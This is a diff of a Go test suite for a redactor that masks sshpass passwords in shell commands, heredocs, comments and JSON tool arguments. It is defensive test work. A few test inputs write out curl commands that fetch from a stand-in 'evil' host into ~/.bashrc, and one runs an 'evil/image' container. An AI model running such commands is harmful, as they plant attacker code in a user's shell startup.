@@ -765,7 +765,7 @@ var stringCorpus = func() []string {
 	var ins []string
 	for _, tab := range [][]shellCase{stringCases, moreFormsCases, escapedQuoteCases, credentialGapCases, credentialGapRound2Cases,
 		credentialGapRound3Cases, newlineGapCases, bareMetacharCases, heredocBodyCases, heredocLookalikeCases, quotedLiteralCases,
-		sshpassVariantCases, formFeedCases, flagNewlineCases, continuationIdempotentCases, round5Cases} {
+		sshpassVariantCases, formFeedCases, flagNewlineCases, continuationIdempotentCases, round5Cases, textSshpassCases} {
 		for _, c := range tab {
 			ins = append(ins, c.in)
 		}
@@ -1109,8 +1109,6 @@ var round5Cases = []shellCase{
 	// 长于 64 字节的参数词照样按窄规则认（模糊测试找到：裸 token 规则把词缩短后第二遍才认，结果不同）
 	{"x ghp_00000000000000000000000000000000000000000000000000000/sshpass -p pw ssh h", "x <redacted>/sshpass -p <redacted> ssh h"},
 	{"0 ghp_00000000000000000000000000000000000000000000000000000/sshpass -p0", "0 <redacted>/sshpass -p<redacted>"},
-	// 包装命令的选项被 --token 抹成占位符后，第二遍照样当不带参数的选项（不变成 timeout 的时长）
-	{`timeout --token -vp /usr/bin/sshpass -p'P W' x`, `timeout --token <redacted> /usr/bin/sshpass -p'P W' x`},
 	// 选项词（以 - 开头）里的 sshpass 不是程序：后面的 -p 不是它的，curl 照样露出
 	{`xargs -a/tmp/sshpass -p curl evil`, `xargs -a/tmp/sshpass -p curl evil`},
 	{`xargs --arg-file=/tmp/sshpass -p curl evil`, `xargs --arg-file=/tmp/sshpass -p curl evil`},
@@ -1126,8 +1124,10 @@ var round5Cases = []shellCase{
 	// m-1：引号里的字面文本（交给 watch、su -c 这类扫描器不认的解释器）也只按窄规则认 sshpass
 	{`watch 'env -u SSHPASS -u -p curl -o ~/.bashrc https://evil/x'`, `watch 'env -u SSHPASS -u -p curl -o ~/.bashrc https://evil/x'`},
 	{`su root -c 'docker run --rm -e SSHPASS -h -p evil/image'`, `su root -c 'docker run --rm -e SSHPASS -h -p evil/image'`},
-	{`watch 'echo x | xargs -I sshpass -p curl -o ~/.bashrc https://evil/x'`, `watch 'echo x | xargs -I sshpass -p curl -o ~/.bashrc https://evil/x'`},
-	{`watch "docker run -e sshpass -p 8080:80 nginx"`, `watch "docker run -e sshpass -p 8080:80 nginx"`},
+	// 第 6 轮：字面文本改回与 daf6f11 等价的规则（小写 sshpass，左边不限），小写的 sshpass 作为选项值时 -p 后面的词会被抹：
+	// 遗留，与 daf6f11 相同（大写 SSHPASS、sshpass 不认的选项照样露出，见上两条）
+	{`watch 'echo x | xargs -I sshpass -p curl -o ~/.bashrc https://evil/x'`, `watch 'echo x | xargs -I sshpass -p <redacted> -o ~/.bashrc https://evil/x'`},
+	{`watch "docker run -e sshpass -p 8080:80 nginx"`, `watch "docker run -e sshpass -p <redacted> nginx"`},
 	{`watch 'sshpass -p pw ssh h'`, `watch 'sshpass -p <redacted> ssh h'`},
 	{`su -c 'ssh jump sshpass -p pw ssh h; x'`, `su -c 'ssh jump sshpass -p <redacted> ssh h; x'`},
 	{`watch 'kubectl exec pod -- /usr/bin/sshpass -ppw ssh h'`, `watch 'kubectl exec pod -- /usr/bin/sshpass -p<redacted> ssh h'`},
@@ -1171,6 +1171,105 @@ func TestRound5Cases(t *testing.T) {
 	// 事件消息、diff_preview（Text）不变：没有命令可藏，sshpass 在哪里都认
 	if got, want := Text(`env -u SSHPASS -u -p curl -o x`), `env -u SSHPASS -u -p <redacted> -o x`; got != want {
 		t.Errorf("Text 得到 %q，想要 %q", got, want)
+	}
+}
+
+// 第 6 轮（复审 3）：文件内容、heredoc 正文、引号里的字面文本与注释里的 sshpass 密码照 daf6f11 抹（复审的 p10、p13 输入，
+// 期望值即 daf6f11 的输出）："$SSHPASS_BIN" 不是 sshpass 这个词、subprocess.run 的参数分在几个引号里，两者 daf6f11 也不抹
+var textSshpassCases = []shellCase{
+	{"cat > deploy.sh <<'EOF'\nsshpass -v -p hunter2 ssh h\nEOF", "cat > deploy.sh <<'EOF'\nsshpass -v -p <redacted> ssh h\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nsshpass -P assword: -p hunter2 ssh h\nEOF", "cat > deploy.sh <<'EOF'\nsshpass -P assword: -p <redacted> ssh h\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nsshpass -vp hunter2 ssh h\nEOF", "cat > deploy.sh <<'EOF'\nsshpass -vp <redacted> ssh h\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nsudo -E sshpass -p hunter2 ssh h\nEOF", "cat > deploy.sh <<'EOF'\nsudo -E sshpass -p <redacted> ssh h\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nxargs -0 sshpass -p hunter2 ssh\nEOF", "cat > deploy.sh <<'EOF'\nxargs -0 sshpass -p <redacted> ssh\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nenv -i sshpass -p hunter2 ssh h\nEOF", "cat > deploy.sh <<'EOF'\nenv -i sshpass -p <redacted> ssh h\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nX=$(cat f) sshpass -p hunter2 ssh h\nEOF", "cat > deploy.sh <<'EOF'\nX=$(cat f) sshpass -p <redacted> ssh h\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nif sshpass -p hunter2 ssh h true; then :; fi\nEOF", "cat > deploy.sh <<'EOF'\nif sshpass -p <redacted> ssh h true; then :; fi\nEOF"},
+	{"cat > deploy.sh <<'EOF'\n  sshpass -p hunter2 ssh h\nEOF", "cat > deploy.sh <<'EOF'\n  sshpass -p <redacted> ssh h\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nfor h in a b; do sshpass -p hunter2 ssh $h; done\nEOF", "cat > deploy.sh <<'EOF'\nfor h in a b; do sshpass -p <redacted> ssh $h; done\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nsshpass -p \"hunter2\" ssh h\nEOF", "cat > deploy.sh <<'EOF'\nsshpass -p <redacted> ssh h\nEOF"},
+	{"cat > deploy.sh <<'EOF'\n\"$SSHPASS_BIN\" -p hunter2 ssh h\nEOF", "cat > deploy.sh <<'EOF'\n\"$SSHPASS_BIN\" -p hunter2 ssh h\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nPW=x; sshpass -p\"$PW\" ssh h\nEOF", "cat > deploy.sh <<'EOF'\nPW=x; sshpass -p<redacted> ssh h\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nsshpass -p hunter2 scp a h:b && sshpass -p hunter2 ssh h\nEOF", "cat > deploy.sh <<'EOF'\nsshpass -p <redacted> scp a h:b && sshpass -p <redacted> ssh h\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nsshpass -p a sshpass -p b\nEOF", "cat > deploy.sh <<'EOF'\nsshpass -p <redacted> sshpass -p <redacted>\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nnohup sshpass -p hunter2 ssh h &\nEOF", "cat > deploy.sh <<'EOF'\nnohup sshpass -p <redacted> ssh h &\nEOF"},
+	{"cat > deploy.sh <<'EOF'\n{ sshpass -p hunter2 ssh h; }\nEOF", "cat > deploy.sh <<'EOF'\n{ sshpass -p <redacted> ssh h; }\nEOF"},
+	{"cat > deploy.sh <<'EOF'\n! sshpass -p hunter2 ssh h\nEOF", "cat > deploy.sh <<'EOF'\n! sshpass -p <redacted> ssh h\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nrsync -e \"sshpass -p hunter2 ssh\" a h:b\nEOF", "cat > deploy.sh <<'EOF'\nrsync -e \"sshpass -p <redacted> ssh\" a h:b\nEOF"},
+	{"cat > deploy.sh <<'EOF'\nrsync -e 'sshpass -p hunter2 ssh' a h:b\nEOF", "cat > deploy.sh <<'EOF'\nrsync -e 'sshpass -p <redacted> ssh' a h:b\nEOF"},
+	{"echo 'sshpass -v -p hunter2 ssh h' >> run.sh", "echo 'sshpass -v -p <redacted> ssh h' >> run.sh"},
+	{"echo 'sudo -E sshpass -p hunter2 ssh h' >> run.sh", "echo 'sudo -E sshpass -p <redacted> ssh h' >> run.sh"},
+	{"rsync -e 'sshpass -p hunter2 ssh' a h:b", "rsync -e 'sshpass -p <redacted> ssh' a h:b"},
+	{"rsync -e \"sshpass -p hunter2 ssh -o StrictHostKeyChecking=no\" a h:b", "rsync -e \"sshpass -p <redacted> ssh -o StrictHostKeyChecking=no\" a h:b"},
+	{"rsync -e 'sshpass -v -p hunter2 ssh' a h:b", "rsync -e 'sshpass -v -p <redacted> ssh' a h:b"},
+	{"rsync --rsh='sshpass -p hunter2 ssh' a h:b", "rsync --rsh='sshpass -p <redacted> ssh' a h:b"},
+	{"rsync --rsh=\"sshpass -p hunter2 ssh\" a h:b", "rsync --rsh=\"sshpass -p <redacted> ssh\" a h:b"},
+	{"GIT_SSH_COMMAND='sshpass -p hunter2 ssh' git pull", "GIT_SSH_COMMAND='sshpass -p <redacted> ssh' git pull"},
+	{"export RSYNC_RSH=\"sshpass -p hunter2 ssh\"", "export RSYNC_RSH=\"sshpass -p <redacted> ssh\""},
+	{"ansible all -e 'ansible_ssh_common_args=\"\"' --ssh-extra-args='sshpass -p hunter2'", "ansible all -e 'ansible_ssh_common_args=\"\"' --ssh-extra-args='sshpass -p <redacted>'"},
+	{"watch -n 5 'sshpass -v -p hunter2 ssh h uptime'", "watch -n 5 'sshpass -v -p <redacted> ssh h uptime'"},
+	{"# sshpass -v -p hunter2 ssh h", "# sshpass -v -p <redacted> ssh h"},
+	{"cat <<EOF > x.py\nos.system(\"sshpass -p hunter2 ssh h\")\nEOF", "cat <<EOF > x.py\nos.system(\"sshpass -p <redacted> ssh h\")\nEOF"},
+	{"echo \"os.system('sshpass -p hunter2 ssh h')\" > x.py", "echo \"os.system('sshpass -p <redacted> ssh h')\" > x.py"},
+	{"printf '%s\\n' 'sshpass -p hunter2 ssh h' > x.sh", "printf '%s\\n' 'sshpass -p <redacted> ssh h' > x.sh"},
+}
+
+var textSshpassArgs = []struct{ in, want string }{
+	{"{\"path\":\"deploy.sh\",\"content\":\"#!/bin/sh\\nsshpass -v -p hunter2 ssh h\\n\"}", "{\"content\":\"#!/bin/sh\\nsshpass -v -p <redacted> ssh h\\n\",\"path\":\"deploy.sh\"}"},
+	{"{\"path\":\"deploy.sh\",\"content\":\"#!/bin/sh\\nsudo -E sshpass -p hunter2 ssh h\\n\"}", "{\"content\":\"#!/bin/sh\\nsudo -E sshpass -p <redacted> ssh h\\n\",\"path\":\"deploy.sh\"}"},
+	{"{\"content\":\"rsync -e 'sshpass -p hunter2 ssh' a h:b\"}", "{\"content\":\"rsync -e 'sshpass -p <redacted> ssh' a h:b\"}"},
+	{"{\"content\":\"rsync -e \\\"sshpass -p hunter2 ssh\\\" a h:b\"}", "{\"content\":\"rsync -e \\\"sshpass -p <redacted> ssh\\\" a h:b\"}"},
+	{"{\"content\":\"x=\\\"sshpass -p hunter2 ssh\\\"\"}", "{\"content\":\"x=\\\"sshpass -p <redacted> ssh\\\"\"}"},
+	{"{\"content\":\"RSYNC_RSH=sshpass -p hunter2\"}", "{\"content\":\"RSYNC_RSH=sshpass -p <redacted>\"}"},
+	{"{\"note\":\"use `sshpass -p hunter2 ssh h`\"}", "{\"note\":\"use `sshpass -p <redacted> ssh h`\"}"},
+	{"{\"note\":\"(sshpass -p hunter2 ssh h)\"}", "{\"note\":\"(sshpass -p <redacted> ssh h)\"}"},
+	{"{\"query\":\"sshpass -p hunter2\"}", "{\"query\":\"sshpass -p <redacted>\"}"},
+	{"{\"content\":\"[ -x /usr/bin/sshpass ] && /usr/bin/sshpass -p hunter2 ssh h\"}", "{\"content\":\"[ -x /usr/bin/sshpass ] && /usr/bin/sshpass -p <redacted> ssh h\"}"},
+	{"{\"content\":\"subprocess.run(['sshpass', '-p', 'hunter2', 'ssh', 'h'])\"}", "{\"content\":\"subprocess.run(['sshpass', '-p', 'hunter2', 'ssh', 'h'])\"}"},
+	{"{\"content\":\"cmd = \\\"sshpass -p hunter2 ssh h\\\"\"}", "{\"content\":\"cmd = \\\"sshpass -p <redacted> ssh h\\\"\"}"},
+	{"{\"content\":\"cmd = 'sshpass -p hunter2 ssh h'\"}", "{\"content\":\"cmd = 'sshpass -p <redacted> ssh h'\"}"},
+	{"{\"path\":\"run.py\",\"content\":\"import os\\nos.system(\\\"sshpass -p hunter2 ssh h uptime\\\")\\n\"}", "{\"content\":\"import os\\nos.system(\\\"sshpass -p <redacted> ssh h uptime\\\")\\n\",\"path\":\"run.py\"}"},
+	{"{\"path\":\"run.js\",\"content\":\"execSync('sshpass -p hunter2 ssh h uptime')\"}", "{\"content\":\"execSync('sshpass -p <redacted> ssh h uptime')\",\"path\":\"run.js\"}"},
+	{"{\"path\":\"README.md\",\"content\":\"Run `sshpass -p hunter2 ssh h` to connect\"}", "{\"content\":\"Run `sshpass -p <redacted> ssh h` to connect\",\"path\":\"README.md\"}"},
+	{"{\"path\":\"Makefile\",\"content\":\"deploy:\\n\\tsshpass -p hunter2 scp a h:b\\n\"}", "{\"content\":\"deploy:\\n\\tsshpass -p <redacted> scp a h:b\\n\",\"path\":\"Makefile\"}"},
+	{"{\"path\":\"Dockerfile\",\"content\":\"RUN sshpass -p hunter2 scp a h:b\"}", "{\"content\":\"RUN sshpass -p <redacted> scp a h:b\",\"path\":\"Dockerfile\"}"},
+	{"{\"path\":\"ci.yml\",\"content\":\"script:\\n  - sshpass -p hunter2 ssh h make\\n\"}", "{\"content\":\"script:\\n  - sshpass -p <redacted> ssh h make\\n\",\"path\":\"ci.yml\"}"},
+	{"{\"path\":\"ci.yml\",\"content\":\"run: |\\n  sshpass -p hunter2 ssh h make\\n\"}", "{\"content\":\"run: |\\n  sshpass -p <redacted> ssh h make\\n\",\"path\":\"ci.yml\"}"},
+	{"{\"path\":\"deploy.sh\",\"content\":\"  sshpass -p hunter2 ssh h\\n\"}", "{\"content\":\"  sshpass -p <redacted> ssh h\\n\",\"path\":\"deploy.sh\"}"},
+	{"{\"path\":\"deploy.sh\",\"content\":\"ssh_cmd=\\\"sshpass -p hunter2 ssh\\\"\\n\"}", "{\"content\":\"ssh_cmd=\\\"sshpass -p <redacted> ssh\\\"\\n\",\"path\":\"deploy.sh\"}"},
+	{"{\"path\":\"x.sh\",\"content\":\"out=$(sshpass -p hunter2 ssh h ls)\"}", "{\"content\":\"out=$(sshpass -p <redacted> ssh h ls)\",\"path\":\"x.sh\"}"},
+	{"{\"path\":\"x.sh\",\"content\":\"out=`sshpass -p hunter2 ssh h ls`\"}", "{\"content\":\"out=`sshpass -p <redacted> ssh h ls`\",\"path\":\"x.sh\"}"},
+	{"{\"path\":\"x.sh\",\"content\":\"sudo sshpass -p hunter2 ssh h\"}", "{\"content\":\"sudo sshpass -p <redacted> ssh h\",\"path\":\"x.sh\"}"},
+	{"{\"path\":\"x.sh\",\"content\":\"echo hi && sshpass -p hunter2 ssh h\"}", "{\"content\":\"echo hi && sshpass -p <redacted> ssh h\",\"path\":\"x.sh\"}"},
+	{"{\"path\":\"x.sh\",\"content\":\"sshpass -p hunter2 ssh -o StrictHostKeyChecking=no h\"}", "{\"content\":\"sshpass -p <redacted> ssh -o StrictHostKeyChecking=no h\",\"path\":\"x.sh\"}"},
+	{"{\"path\":\"x.sh\",\"content\":\"sshpass -e ssh h # SSHPASS=x\\nsshpass -v -p hunter2 ssh h\"}", "{\"content\":\"sshpass -e ssh h # SSHPASS=<redacted>\\nsshpass -v -p <redacted> ssh h\",\"path\":\"x.sh\"}"},
+}
+
+// -p 紧贴空引号在文本里同样按 bash 当 -p：密码是下一个词
+var textSshpassEmptyQuote = []shellCase{
+	{"cat > x.sh <<'EOF'\nsshpass -p'' hunter2 ssh h\nEOF", "cat > x.sh <<'EOF'\nsshpass -p'' <redacted> ssh h\nEOF"},
+	{`echo "sshpass -p'' hunter2 ssh h"`, `echo "sshpass -p'' <redacted> ssh h"`},
+	{"# sshpass -v -p\"\" hunter2 ssh h", "# sshpass -v -p\"\" <redacted> ssh h"},
+}
+
+func TestTextSshpassRestored(t *testing.T) {
+	for _, c := range append(append([]shellCase{}, textSshpassCases...), textSshpassEmptyQuote...) {
+		got := String(c.in)
+		if got != c.want {
+			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+		if again := String(got); again != got {
+			t.Errorf("String 不幂等: %q → %q → %q", c.in, got, again)
+		}
+	}
+	for _, c := range append(textSshpassArgs, struct{ in, want string }{`{"content":"sshpass -p'' hunter2 ssh h"}`, `{"content":"sshpass -p'' <redacted> ssh h"}`}) {
+		got := string(args(json.RawMessage(c.in)))
+		if got != c.want {
+			t.Errorf("args(%s)\n 得到 %s\n 想要 %s", c.in, got, c.want)
+		}
+		if again := string(args(json.RawMessage(got))); again != got {
+			t.Errorf("args 不幂等: %s → %s", got, again)
+		}
 	}
 }
 
